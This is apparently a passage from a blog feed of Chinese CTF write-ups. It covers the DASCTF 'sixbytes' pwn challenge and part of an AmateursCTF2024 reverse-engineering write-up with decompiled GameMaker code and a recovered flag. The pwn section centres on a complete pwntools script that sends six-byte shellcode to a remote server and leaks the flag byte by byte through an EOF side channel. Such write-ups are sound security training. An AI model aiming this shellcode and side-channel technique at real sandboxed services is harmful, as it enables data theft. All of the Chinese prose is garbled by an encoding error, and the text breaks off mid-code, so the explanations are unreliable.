<h2 id="2024-DASCTFé‡‘ç§‹åæœˆ-sixbytes"><a href="#2024-DASCTFé‡‘ç§‹åæœˆ-sixbytes" class="headerlink" title="[2024 DASCTFé‡‘ç§‹åæœˆ] sixbytes"></a>[2024 DASCTFé‡‘ç§‹åæœˆ] sixbytes</h2><p>è¿™é¢˜çš„é€»è¾‘å¾ˆç®€å•:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">readflag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  fd = open(<span class="string">&quot;flag&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, aDasctfTestflag, <span class="number">0x100</span>uLL);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> aDasctfTestflag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> *<span class="title function_">readshellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0xFFFFFFFF</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">6uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">setrule</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;seccomp_init&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)seccomp_load(v1) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;seccomp_load&quot;</span>);</span><br><span class="line">    seccomp_release(v1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  seccomp_release(v1);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">char</span> *, _QWORD); <span class="comment">// [rsp-10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp-8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  sub_564B45B0534A();</span><br><span class="line">  alarm(<span class="number">0xA</span>u);</span><br><span class="line">  v4 = readflag();</span><br><span class="line">  v3 = (<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *, _QWORD))readshellcode(<span class="number">10LL</span>);</span><br><span class="line">  alarm(<span class="number">5u</span>);</span><br><span class="line">  setrule();</span><br><span class="line">  v3(v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨äº†seccompçš„é»˜è®¤è§„åˆ™ å³ç¦ç”¨æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ è¿™æ„å‘³ç€åŸºæœ¬ä¸Šä¸å¯èƒ½è¾“å‡ºè¯»å–åˆ°çš„flag</p>
<p>ç»è¿‡è°ƒè¯•å¯ä»¥å‘ç°è°ƒç”¨ç”¨æˆ·è¾“å…¥çš„shellcodeæ—¶<code>RDI</code>ä¸­å­˜æ”¾è¯»åˆ°çš„flagåœ°å€ é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™æ ·çš„æ€è·¯æ¥çˆ†ç ´å¾—åˆ°flag: æ„é€  <code>cmp byte ptr [rdi + index], chr</code> æ¥å¯¹æ¯”çœŸæ­£flagå¯¹åº”ä½ä¸Šå’ŒçŒœæµ‹çš„å­—ç¬¦</p>
<p>é™¤æ­¤ä¹‹å¤–è¿˜è¦é€‰æ‹©ç”¨æ¥çˆ†ç ´çš„ä¿¡é“ è¿™é‡Œé€‰ç”¨ç¨‹åºæ˜¯å¦å·²ç»è¶…å‡ºè¾“å‡ºæµå°¾éƒ¨(EOFerror) å› ä¸ºå½“ç¨‹åºæ‰§è¡Œåˆ°6 bytesåé¢çš„<code>\x00</code>æ—¶ä¼šå› ä¸º<code>Bad Instruction</code>è€Œé€€å‡º æ­¤æ—¶å†æ¥æ”¶æ•°æ®å°±ä¼šè§¦å‘<code>EOFerror</code> ç»¼ä¸Šå¯ä»¥æ„é€ ä»¥ä¸‹shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loop:</span><br><span class="line">    cmp byte ptr [rdi + index], chr;</span><br><span class="line">    jne loop;</span><br></pre></td></tr></table></figure>

<p>è®©pwntoolsåœ¨<code>timeout</code>çš„æ—¶é—´èŒƒå›´å†…æ¥æ”¶æ•°æ® å¦‚æœçŒœæµ‹å€¼æ˜¯æ­£ç¡®çš„ç¨‹åºä¼šç»§ç»­æ‰§è¡Œ<code>\x00</code>å¹¶åœ¨æ¥æ”¶æ•°æ®æ—¶æŠ›å‡º<code>EOFerror</code> å¦åˆ™ä¼šæ­£å¸¸æ¥æ”¶åˆ°<code>b&#39;&#39;</code>ä¸æŠ¥é”™ åˆ©ç”¨è¿™ç‚¹æ„é€ ä»¥ä¸‹EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Test_charAt_Index</span>(<span class="params">ip, port, index, c</span>):</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    code = <span class="string">f&quot;loop:;cmp byte ptr [rdi + <span class="subst">&#123;<span class="built_in">hex</span>(index)&#125;</span>], <span class="subst">&#123;<span class="built_in">hex</span>(c)&#125;</span>;jne loop;&quot;</span></span><br><span class="line">    asmcode, _ = ks.asm(code)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(<span class="built_in">bytes</span>(asmcode))</span><br><span class="line">        data = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;DASCTF&#123;&quot;</span></span><br><span class="line">table = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&quot;0123456789abcdef-&#123;&#125;&quot;</span>]</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">while</span> flag[-<span class="number">1</span>] != <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> Test_charAt_Index(<span class="string">&quot;node5.buuoj.cn&quot;</span>, xxxxx, <span class="built_in">len</span>(flag), i):</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>ä¸é€†å‘ä¸­æœ¬åœ°çˆ†ç ´çš„ä¾§ä¿¡é“ä¸åŒ é¶æœºåŒæ—¶åªèƒ½è¿è¡Œä¸€ä¸ªç›®æ ‡ç¨‹åº æ‰€ä»¥ä¸è¿›è¡Œå¤šçº¿ç¨‹çˆ†ç ´ è¿™æ ·å°±éœ€è¦æ ¹æ®è¾“å‡ºçš„flagç‰¹å¾é€‚å½“è¿›è¡ŒtableèŒƒå›´çš„ç¼©å°æˆ–æ›´æ”¹<code>timeout</code></p>
]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>Pwn</tag>
        <tag>ä¾§ä¿¡é“</tag>
      </tags>
  </entry>
  <entry>
    <title>AmateursCTF2024é€†å‘æ–¹å‘wp</title>
    <url>/2024/04/15/AmateursCTF2024%E9%80%86%E5%90%91%E6%96%B9%E5%90%91wp/</url>
    <content><![CDATA[<p>å‚èµ›ID:1K0CT, Team : 4W3, æœ€ç»ˆæ’å:88th(å…¬å¼€èµ›é“)</p>
<p>åšåˆ°floctoå¸ˆå‚…çš„é¢˜çœŸçš„æ¯æ¬¡éƒ½è¦æœ‰æ„Ÿè€Œå‘ä¸€ä¸‹ çœŸæ­£èƒ½è®©æˆ‘å…¨èº«å¿ƒæŠ•å…¥çš„èµ›é¢˜ ç»™ä¸€ä¸ªé™Œç”Ÿçš„è€ƒç‚¹ ä½†æ˜¯ä¸è‡³äºè®©ä½ å¯¸æ­¥éš¾è¡Œ æœ‰ç§æ¥è§¦æ–°ä¸œè¥¿çš„æ—¶å€™é‚£ä¸ªä¸œè¥¿å¯¹ä½ æ¬²æ‹’è¿˜è¿æ¿€å‘æ¢ç´¢æ¬²çš„ç¾ å¯èƒ½è¿™å°±æ˜¯floctoå¸ˆå‚…å‡ºçš„é¢˜çš„é­…åŠ›å§</p>
<span id="more"></span>

<h2 id="revtale-1-GMé€†å‘"><a href="#revtale-1-GMé€†å‘" class="headerlink" title="revtale-1 | GMé€†å‘"></a>revtale-1 | GMé€†å‘</h2><p>å’ŒLACTFé‚£æ¬¡ä¸åŒçš„æ˜¯è¿™æ¬¡å°±æ˜¯çº¯ç²¹çš„å¥—GMå£³æ£€æµ‹flagè€Œä¸æ˜¯æ¸¸æˆé€†å‘ æ²¡æœ‰é­”æ”¹dataæ–‡ä»¶ ç›´æ¥ç”¨<code>UndertaleModTool</code>çœ‹ä»£ç å³å¯:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pk = [<span class="number">95</span>, <span class="number">119</span>, <span class="number">51</span>]</span><br><span class="line"><span class="built_in">draw_set_font</span>(font_det)</span><br><span class="line"><span class="keyword">for</span> (var i = <span class="number">0</span>; i &lt; <span class="built_in">array_length</span>(char_grid); i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (var j = <span class="number">0</span>; j &lt; <span class="built_in">array_length</span>(char_grid[i]); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        jitter_x = <span class="built_in">random_range</span>(<span class="number">-2</span>, <span class="number">2</span>)</span><br><span class="line">        jitter_y = <span class="built_in">random_range</span>(<span class="number">-2</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> ((cc == j) &amp;&amp; (rc == i) &amp;&amp; (!solv))</span><br><span class="line">            <span class="built_in">draw_set_color</span>(c_yellow)</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">draw_set_color</span>(c_white)</span><br><span class="line">        <span class="built_in">draw_text_transformed</span>(((<span class="number">128</span> + (j * <span class="number">64</span>)) + jitter_x), ((<span class="number">100</span> + (i * <span class="number">32</span>)) + jitter_y), char_grid[i][j], <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ch = char_grid[rc][cc]</span><br><span class="line"><span class="keyword">if</span> ((ch == <span class="string">&quot;&#125;&quot;</span>) &amp;&amp; (!solv))</span><br><span class="line">    <span class="built_in">draw_set_color</span>(c_yellow)</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">draw_set_color</span>(c_white)</span><br><span class="line"><span class="keyword">if</span> ((cnt &gt; <span class="number">75</span>))</span><br><span class="line">    <span class="built_in">draw_text_transformed</span>((<span class="number">320</span> - ((<span class="number">2</span> * <span class="built_in">string_width</span>(s)) / <span class="number">2</span>)), <span class="number">20</span>, s, (<span class="number">2</span> + scl_modif), (<span class="number">2</span> + scl_modif), <span class="number">0</span>)</span><br><span class="line">old = <span class="string">&quot;amateursCTF&#123;fak3_flag_w1dth_t3st&#125;&quot;</span></span><br><span class="line"><span class="built_in">draw_text_transformed</span>((<span class="number">320</span> - ((<span class="number">2</span> * <span class="built_in">string_width</span>(<span class="string">&quot;amateursCTF&#123;fak3_flag_w1dth_t3st&#125;&quot;</span>)) / <span class="number">2</span>)), <span class="number">60</span>, current, <span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>)</span><br><span class="line">dr = <span class="number">0</span></span><br><span class="line">dc = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(<span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">show_debug_message</span>(ch)</span><br><span class="line">    <span class="keyword">if</span> ((ch != <span class="string">&quot;&lt;&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">string_length</span>(current) &lt; <span class="number">40</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            current += ch</span><br><span class="line">            <span class="keyword">if</span> ((ch == <span class="string">&quot;&#125;&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">scr_check_flag</span>(current)</span><br><span class="line">                &#123;</span><br><span class="line">                    solv = <span class="number">1</span></span><br><span class="line">                    <span class="built_in">audio_play_sound</span>(snd_cymbal, <span class="number">10</span>, <span class="literal">false</span>)</span><br><span class="line">                    <span class="built_in">window_set_caption</span>(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">                    shk += <span class="number">10</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    fails += <span class="number">1</span></span><br><span class="line">                    s = (<span class="string">&quot;incorrect flag attempt #&quot;</span> + <span class="built_in">string</span>(fails))</span><br><span class="line">                    current = <span class="string">&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> (((fails % <span class="number">10</span>) == <span class="number">0</span>))</span><br><span class="line">                        s = <span class="string">&quot;Stay determined!&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> ((fails &gt; <span class="number">10</span>))</span><br><span class="line">                        shk += <span class="number">120</span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> ((fails &gt; <span class="number">3</span>))</span><br><span class="line">                        shk += <span class="number">30</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            s = <span class="string">&quot;That&#x27;s not the flag!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((<span class="built_in">string_length</span>(current) &gt; <span class="number">0</span>))</span><br><span class="line">        current = <span class="built_in">string_delete</span>(current, <span class="built_in">string_length</span>(current), <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_down)</span><br><span class="line">    dr += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_up)</span><br><span class="line">    dr -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_right)</span><br><span class="line">    dc += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">keyboard_check_pressed</span>(vk_left)</span><br><span class="line">    dc -= <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> ((dr != <span class="number">0</span>) || (dc != <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    nr = (rc + dr)</span><br><span class="line">    nr = <span class="built_in">clamp</span>(nr, <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">array_length</span>(char_grid[nr]) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        nr = (rc + (<span class="number">2</span> * dr))</span><br><span class="line">        nr = <span class="built_in">clamp</span>(nr, <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid) - <span class="number">1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    nc = <span class="built_in">clamp</span>((cc + dc), <span class="number">0</span>, (<span class="built_in">array_length</span>(char_grid[nr]) - <span class="number">1</span>))</span><br><span class="line">    rc = nr</span><br><span class="line">    cc = nc</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((scl_modif &gt; <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    v = <span class="built_in">clamp</span>((scl_modif * <span class="number">127.5</span>), <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="built_in">layer_background_blend</span>(bg_id, <span class="built_in">make_color_rgb</span>(v, v, v))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">funcs = [color_get_hue, color_get_green]</span><br><span class="line">function <span class="built_in">scr_check_flag</span>(argument0) <span class="comment">//gml_Script_scr_check_flag</span></span><br><span class="line">&#123;</span><br><span class="line">    l = <span class="built_in">string_lower</span>(argument0)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="string">&quot;gaster&quot;</span>, l) != <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">window_set_caption</span>(<span class="string">&quot;redacted&quot;</span>)</span><br><span class="line">        <span class="built_in">game_end</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="string">&quot;frisk&quot;</span>, l) != <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">window_set_caption</span>(<span class="string">&quot;don&#x27;t make this hard&quot;</span>)</span><br><span class="line">        <span class="built_in">game_end</span>(<span class="number">1</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">string_starts_with</span>(argument0, <span class="string">&quot;amateursCTF&#123;&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">string_length</span>(argument0) &gt; <span class="number">15</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            a = <span class="built_in">scr_a</span>(argument0)</span><br><span class="line">            <span class="keyword">if</span> ((a[<span class="number">12</span>] == <span class="string">&quot;&#123;&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">window_set_caption</span>(<span class="string">&quot;no&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">array_length</span>(a); i++)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            aa = (<span class="built_in">ord</span>(a[<span class="number">12</span>]) &amp; <span class="number">4095</span>)</span><br><span class="line">            ab = (<span class="built_in">ord</span>(a[<span class="number">13</span>]) &amp; <span class="number">2047</span>)</span><br><span class="line">            ac = (<span class="built_in">ord</span>(a[<span class="number">14</span>]) &amp; <span class="number">1023</span>)</span><br><span class="line">            ad = (<span class="built_in">ord</span>(a[<span class="number">15</span>]) &amp; <span class="number">511</span>)</span><br><span class="line">            arr_op = array_reverse</span><br><span class="line">            color_check = color_get_saturation</span><br><span class="line">            <span class="keyword">if</span> ((a[<span class="number">12</span>] == a[<span class="number">13</span>]) &amp;&amp; (a[<span class="number">12</span>] != a[<span class="number">14</span>]))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((ac == (aa - <span class="number">2</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (((ab + <span class="number">152</span>) == self.<span class="built_in">color_check</span>(<span class="number">16711935</span>)) &amp;&amp; ((ad + <span class="number">133</span>) == self.<span class="built_in">color_check</span>(<span class="number">128</span>)))</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">0</span>] ^ <span class="built_in">ord</span>(a[<span class="number">16</span>])) == <span class="number">0</span>))</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">1</span>] ^ <span class="built_in">ord</span>(a[<span class="number">17</span>])) == <span class="number">0</span>))</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="keyword">if</span> (((obj_input_field.pk[<span class="number">2</span>] ^ <span class="built_in">ord</span>(a[<span class="number">18</span>])) == <span class="number">0</span>))</span><br><span class="line">                                &#123;</span><br><span class="line">                                    <span class="keyword">if</span> ((<span class="built_in">ord</span>(a[<span class="number">19</span>]) == (<span class="built_in">power</span>(<span class="number">2</span>, <span class="number">6</span>) | <span class="number">31</span>)))</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        r = self.<span class="built_in">arr_op</span>([<span class="string">&quot;%&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;_&quot;</span>], <span class="number">0</span>, <span class="number">6</span>)</span><br><span class="line">                                        c = <span class="number">0</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">19</span>] == r[<span class="number">0</span>]))</span><br><span class="line">                                            c += <span class="number">1</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">20</span>] == r[<span class="number">1</span>]))</span><br><span class="line">                                            c += <span class="number">2</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">21</span>] == r[<span class="number">2</span>]))</span><br><span class="line">                                            c += <span class="number">3</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">22</span>] == r[<span class="number">3</span>]))</span><br><span class="line">                                            c += <span class="number">4</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">23</span>] == r[<span class="number">4</span>]))</span><br><span class="line">                                            c += <span class="number">5</span></span><br><span class="line">                                        <span class="keyword">if</span> ((a[<span class="number">20</span>] == a[<span class="number">21</span>]))</span><br><span class="line">                                            c += <span class="number">5</span></span><br><span class="line">                                        <span class="keyword">if</span> ((c == <span class="number">15</span>))</span><br><span class="line">                                        &#123;</span><br><span class="line">                                            <span class="keyword">if</span> ((<span class="built_in">string_pos</span>(<span class="built_in">file_text_read_string</span>(<span class="built_in">file_text_open_read</span>(<span class="string">&quot;f.txt&quot;</span>)), argument0) != <span class="number">0</span>))</span><br><span class="line">                                                <span class="built_in">return</span> ((<span class="number">45887</span> == <span class="built_in">scr_c</span>((((<span class="built_in">string_char_at</span>(argument0, <span class="number">29</span>) + <span class="built_in">string_char_at</span>(argument0, <span class="number">30</span>)) + <span class="built_in">string_char_at</span>(argument0, <span class="number">31</span>)) + <span class="built_in">string_char_at</span>(argument0, <span class="number">32</span>)))) &amp;&amp; (<span class="built_in">ord</span>(a[<span class="number">32</span>]) == <span class="number">125</span>));</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">show_message</span>((<span class="string">&quot;flag wrapper missing... you entered &quot;</span> + argument0))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_a</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_a</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    o = []</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">string_length</span>(argument0); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i &gt; <span class="number">0</span>))</span><br><span class="line">            <span class="built_in">array_push</span>(o, <span class="built_in">string_char_at</span>(argument0, i))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_b</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_b</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    alpha = [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((alpha[k] == argument0))</span><br><span class="line">            <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">scr_c</span><span class="params">(argument0)</span> <span class="comment">//gml_Script_scr_c</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    o = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= <span class="built_in">string_length</span>(argument0); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        o *= <span class="number">16</span></span><br><span class="line">        cr = <span class="built_in">string_char_at</span>(argument0, j)</span><br><span class="line">        d = <span class="built_in">scr_b</span>(cr)</span><br><span class="line">        <span class="built_in">show_debug_message</span>((((((((((<span class="string">&quot;+= &quot;</span> + <span class="built_in">string</span>(d)) + <span class="string">&quot; &quot;</span>) + <span class="built_in">string</span>(j)) + <span class="string">&quot; &quot;</span>) + <span class="built_in">string</span>(<span class="built_in">string_length</span>(argument0))) + <span class="string">&quot; &quot;</span>) + argument0) + <span class="string">&quot; &quot;</span>) + cr))</span><br><span class="line">        <span class="keyword">if</span> ((d == <span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        o += d</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹flagè¿›è¡Œäº†åˆ†æ®µæ£€æµ‹ ç›´æ¥è§£å‡ºæ¯æ®µçš„flagæ‹¼æ¥å³å¯<code>amateursCTF&#123;ggez_w3_l0v3_vm_b33f&#125;</code></p>
<h2 id="cplusplus-ä»£ç ç†è§£"><a href="#cplusplus-ä»£ç ç†è§£" class="headerlink" title="cplusplus | ä»£ç ç†è§£"></a>cplusplus | ä»£ç ç†è§£</h2><p>64ä½æ— å£³ ä¸»å‡½æ•°(å·²é‡å‘½åå˜é‡å’Œå‡½æ•°):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 n1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 n2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 num; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">char</span> random[<span class="number">2</span>]; <span class="comment">// [rsp+1Eh] [rbp-52h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">72</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+68h] 